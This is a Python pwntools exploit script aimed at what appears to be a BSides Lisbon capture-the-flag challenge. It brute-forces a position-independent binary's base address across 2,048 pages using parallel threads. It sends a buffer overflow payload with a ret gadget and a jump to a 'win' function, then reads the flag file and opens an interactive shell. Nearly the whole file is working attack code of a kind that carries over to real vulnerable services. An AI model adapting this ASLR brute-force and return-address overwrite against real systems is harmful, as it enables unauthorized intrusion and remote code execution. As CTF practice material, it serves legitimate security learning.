#!/usr/bin/env python3

from pwn import *
import threading
import sys

# Set up pwntools
context.update(arch='amd64', os='linux', log_level='error')

HOST = "7b44d3bf-0008-4576-b715-b08d8cb090b7-lmao.challs.bsideslisbon.org"
PORT = 20298

success_conn = None
lock = threading.Lock()

def try_base(base, attempt):
    """Try exploit with a specific base address"""
    global success_conn
    
    if success_conn:
        return
    
    try:
        r = remote(HOST, PORT, level='error', timeout=2)
        r.recvuntil(b"You say: ", timeout=1)
        
        # Build payload with stack alignment
        payload = b"LMAO"
        payload += b"A" * 28
        payload += b"B" * 8
        payload += p64(base + 0x1016)  # ret gadget
        payload += p64(base + 0x11a9)  # win function
        
        r.sendline(payload)
        r.recvuntil(b"RhsUP2ykTGc\n", timeout=0.5)
        
        # Try to run a command
        r.sendline(b"cat flag.txt")
        response = r.recvline(timeout=0.5)
        
        # Check if we got a flag format response
        if b"BSides" in response or b"FLAG" in response or b"{" in response:
            with lock:
                if not success_conn:
                    success_conn = (r, base, response)
                    log.success(f"SUCCESS! Base: {hex(base)}")
                    log.success(f"Flag: {response.decode()}")
            return
        
        r.close()
    except Exception as e:
        pass

def main():
    log.info(f"Attacking {HOST}:{PORT}")
    log.info("Brute forcing PIE base address with threads...")
    
    # Start from common base and try multiple offsets
    base_start = 0x555555554000
    num_attempts = 2048  # Try 2048 pages = 8MB range
    
    threads = []
    for i in range(num_attempts):
        if success_conn:
            break
            
        base = base_start + (i * 0x1000)
        
        if i % 100 == 0:
            log.info(f"Progress: {i}/{num_attempts} - trying base {hex(base)}")
        
        # Use threading to speed up
        t = threading.Thread(target=try_base, args=(base, i))
        t.start()
        threads.append(t)
        
        # Limit concurrent threads
        if len(threads) >= 20:
            threads[0].join()
            threads.pop(0)
    
    # Wait for all threads
    for t in threads:
        t.join()
    
    if success_conn:
        r, base, flag = success_conn
        log.success(f"Final base address: {hex(base)}")
        log.success(f"Flag: {flag.decode()}")
        r.interactive()
        return 0
    else:
        log.error("Failed to find working base address")
        return 1

if __name__ == "__main__":
    sys.exit(main())
